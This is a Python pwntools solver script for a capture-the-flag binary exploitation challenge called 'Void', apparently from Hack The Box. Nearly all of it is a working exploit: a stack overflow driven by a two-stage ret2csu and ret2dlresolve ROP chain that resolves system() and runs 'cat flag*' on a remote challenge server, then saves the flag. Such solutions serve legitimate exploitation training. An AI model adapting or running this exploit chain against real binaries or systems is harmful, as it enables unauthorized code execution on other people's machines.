#!/usr/bin/env python3
"""
Void (HTB Try Out, medium pwn) — solver.

vuln() does read(0, buf@rbp-0x40, 0xc8): 200-byte read into a 64-byte buffer.
Binary: non-PIE, NX, no canary, ONLY read imported, no syscall gadget,
provided glibc 2.31. Solution: ret2dlresolve in TWO stages (single-stage
chain would exceed the 200-byte read):

Stage 1 (fits exactly in the 200-byte read):
  ret2csu -> read(0, bss, 50) writes the fake dlresolve structures + "cat flag*".
  Then ret -> main (re-enter) so vuln() runs again.

Stage 2 (second overflow):
  pop rdi; ret -> arg0 ("cat flag*") -> PLT0 -> reloc_index.
  The lazy resolver resolves "system" (rdi restored to arg0 by the
  _dl_runtime_resolve trampoline) -> system("cat flag*") prints the flag.
"""

from pwn import *

HOST = "154.57.164.83"
PORT = 30313

context.log_level = "info"
context.arch = "amd64"

BIN = r"files/_work/challenge/void"
e = ELF(BIN)

CSU_POP = 0x4011B2   # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
CSU_CALL = 0x401198  # mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]; ...
READ_GOT = 0x404018
PLT0 = 0x401020
POP_RDI = 0x4011BB   # misaligned `pop rdi; ret`
MAIN = 0x401143
OFFSET = 0x40 + 8    # buffer at rbp-0x40, saved RIP at +8

dlresolve = Ret2dlresolvePayload(e, symbol="system", args=["cat flag*"])
data_addr = dlresolve.data_addr
arg0 = dlresolve.real_args[0]
reloc_index = dlresolve.reloc_index
log.info(f"data_addr={hex(data_addr)} arg0={hex(arg0)} reloc_index={hex(reloc_index)}")

# ---- Stage 1: ret2csu read(0, data_addr, len) then ret to MAIN ----
stage1 = b"A" * OFFSET
stage1 += p64(CSU_POP)
stage1 += p64(0)                     # rbx
stage1 += p64(1)                     # rbp
stage1 += p64(0)                     # r12 -> edi = 0 (stdin)
stage1 += p64(data_addr)             # r13 -> rsi
stage1 += p64(len(dlresolve.payload))  # r14 -> rdx
stage1 += p64(READ_GOT)              # r15 -> call [read@got]
stage1 += p64(CSU_CALL)
stage1 += p64(0)                     # skipped by add rsp,8
stage1 += p64(0) * 6                 # pops rbx,rbp,r12,r13,r14,r15
stage1 += p64(MAIN)                  # ret -> main (second overflow)
# pad so vuln's read(0, buf, 0xc8) consumes EXACTLY 200 bytes
stage1 += b"B" * (0xC8 - len(stage1))
assert len(stage1) == 0xC8, len(stage1)

# ---- Stage 2: pop rdi; arg0; PLT0; reloc_index ----
stage2 = b"C" * OFFSET
stage2 += p64(POP_RDI)
stage2 += p64(arg0)
stage2 += p64(PLT0)
stage2 += p64(reloc_index)
stage2 += p64(0)                     # return address after system

log.info(f"stage1={len(stage1)}B stage2={len(stage2)}B payload={len(dlresolve.payload)}B")

r = remote(HOST, PORT)
r.send(stage1 + dlresolve.payload + stage2)
out = r.recvall(timeout=8)
r.close()

with open("solve/evidence/out.txt", "wb") as f:
    f.write(out)
flag = re.search(rb"HTB\{[^}]+\}", out)
if flag:
    print("FLAG:", flag.group(0).decode())
    with open("final_flag.txt", "w") as f:
        f.write(flag.group(0).decode() + "\n")
else:
    print("no flag found; output saved to solve/evidence/out.txt")
    print(out[-300:])
